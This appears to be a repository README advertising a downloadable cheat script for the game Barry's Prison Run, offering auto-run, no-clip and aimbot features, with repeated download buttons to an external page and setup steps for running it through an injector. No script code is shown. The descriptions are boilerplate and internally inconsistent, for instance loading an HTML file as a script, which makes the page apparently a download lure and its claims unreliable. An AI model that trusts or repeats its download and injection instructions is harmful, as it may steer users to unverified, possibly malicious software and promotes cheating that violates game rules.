# Barry's Prison Run v1.0 - Game Script Utility 2026

> **Automation script for Barry's Prison Run on PC.** Adds movement aid and target-assist behavior with no clip and aimbot features.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryangray1991/barrys-prison-run-script?style=flat-square)](https://github.com/ryangray1991/barrys-prison-run-script)

---

<p align="center">
  <a href="https://ryangray1991.github.io/barrys-prison-run-script/">
    <img src="https://img.shields.io/badge/Download-Barrys%20Prison%20Run%20Script-brightgreen?style=for-the-badge" alt="Download Barry's Prison Run Script">
  </a>
</p>

> **[Download - Barry's Prison Run](https://ryangray1991.github.io/barrys-prison-run-script/)**

---

[Download Latest Build](https://ryangray1991.github.io/barrys-prison-run-script/)

---

## Overview

This utility script is built to streamline play in Barry's Prison Run by handling routine movement and aiming tasks for the player. It can keep the character moving through the prison layout with collision disabled, and its targeting helper is intended to assist during encounters. The goal is to cut down on repeated manual inputs in sections that are otherwise tedious.

The present release emphasizes smoother automatic running, improved no clip behavior, and better stability overall. The three main functions - automatic movement, wall phasing, and assisted targeting - have been checked against the newest game update so they remain dependable in normal gameplay.

---

## Script Features

- **Automatic Run** - Keeps the character moving forward continuously without constant input, making corridor travel and open-area movement easier.
- **No Clip** - Turns off collision handling so the player can move through walls, doors, and other blocking geometry.
- **Aimbot** - Steers aim toward nearby targets automatically to improve accuracy during combat moments.
- **Lightweight Execution** - Packaged as a single script file and intended to use very little system resources.
- **Toggle Controls** - Each option can be switched on or off separately during play with configurable hotkeys.
- **Game Version Support** - Works with the current PC release of Barry's Prison Run.

---

## Setup

1. Download the latest script file from the link above.
2. Extract the contents to a folder of your choice (recommended: `barrys-prison-run-script`).
3. Launch Barry's Prison Run and wait until you reach the main menu.
4. Run the script using your preferred script loader or execution method.
5. Use the default hotkeys to toggle features as needed.

Example load command (if using a script injector):
```
loadscript("barrys-prison-run-script/main.html")
```

---

## Options

| Setting | Default | Description |
|---------|---------|-------------|
| Auto Run | Enabled | Automatically moves character forward |
| No Clip | Disabled | Toggles wall and obstacle collision |
| Aimbot | Disabled | Auto-aims at nearby targets |
| Toggle Key: Auto Run | F1 | Enables/disables automatic movement |
| Toggle Key: No Clip | F2 | Enables/disables collision bypass |
| Toggle Key: Aimbot | F3 | Enables/disables targeting assist |

---

## Compatibility

- **Platform:** PC
- **Game Version:** Current Barry's Prison Run release
- **Known Limitations:** No clip may cause visual glitches in certain map sections. Aimbot may not function correctly during scripted cutscenes or boss phases with invulnerability frames.
- **Unsupported:** Console platforms, mobile versions, and emulated environments.

---

## FAQ

**How do I install the script?**  
Download the script file, place it in a dedicated folder, and load it through a compatible script runner before or during gameplay.

**Will updates break the script?**  
Game patches can affect how it works. After major game updates, check the repository for compatibility notes or fixes.

**Can I customize the hotkeys?**  
Yes. Edit the configuration section near the top of the script file to change the toggle key assignments.

**Does this work on all versions of Barry's Prison Run?**  
It is tested against the latest PC version. Older builds may only work partially, or not at all.

**Where are script settings stored?**  
All settings live inside the script file itself. No separate configuration files are created.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
